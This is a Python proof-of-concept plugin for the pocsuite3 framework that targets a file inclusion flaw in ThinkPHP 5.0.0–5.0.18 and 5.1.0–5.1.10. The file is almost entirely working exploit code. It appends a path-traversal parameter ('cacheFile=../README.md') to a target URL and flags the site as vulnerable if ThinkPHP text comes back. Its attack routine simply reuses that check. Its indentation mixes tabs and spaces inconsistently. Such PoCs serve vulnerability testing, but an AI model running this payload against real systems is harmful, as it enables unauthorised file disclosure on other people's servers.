from pocsuite3.api import Output, POCBase, register_poc, requests, logger
from pocsuite3.api import get_listener_ip, get_listener_port
from pocsuite3.api import REVERSE_PAYLOAD
from pocsuite3.api import OptString
from pocsuite3.lib.utils import random_str
from collections import OrderedDict
import requests
from urllib.parse import urlparse
from urllib.parse import parse_qs


class DemoPOC(POCBase):
	
	vulID = '1'
	version = '1'
	name = "Thinkphp include demo"
	appName = 'Thinkphp'
	appVersion = '5.x'
	desc = "本次漏洞存在于 ThinkPHP 模板引擎中，在加载模版解析变量时存在变量覆盖问题，而且程序没有对数据进行很好的过滤，最终导致 文件包含漏洞 的产生。漏洞影响版本： 5.0.0<=ThinkPHP5<=5.0.18 、5.1.0<=ThinkPHP<=5.1.10."


	def _verify(self):

			result = {}
			kkk = urlparse(self.url)
			query_dict = parse_qs(kkk.query)
			payload = 'cacheFile=../README.md'

			if query_dict:
				url = self.url+'&'+payload
			else:
		  		url = self.url+'?'+payload	
			try:
				request = requests.get(url)
				if request.text:
					if 'ThinkPHP' in request.text:
							result['VerifyInfo'] = {}
							result['VerifyInfo']['url'] = url
							result['VerifyInfo']['payload'] = payload 
			except Exception as e:
						pass	
			
			return self.parse_output(result)


	def parse_output(self,result):
		 	
			output = Output(self)
			if result:
			 	output.success(result)
		
			else:
				output.fail('target is not vulnerable')
		
			return output
		 
	def _attack(self):
		return self._verify()


register_poc(DemoPOC)
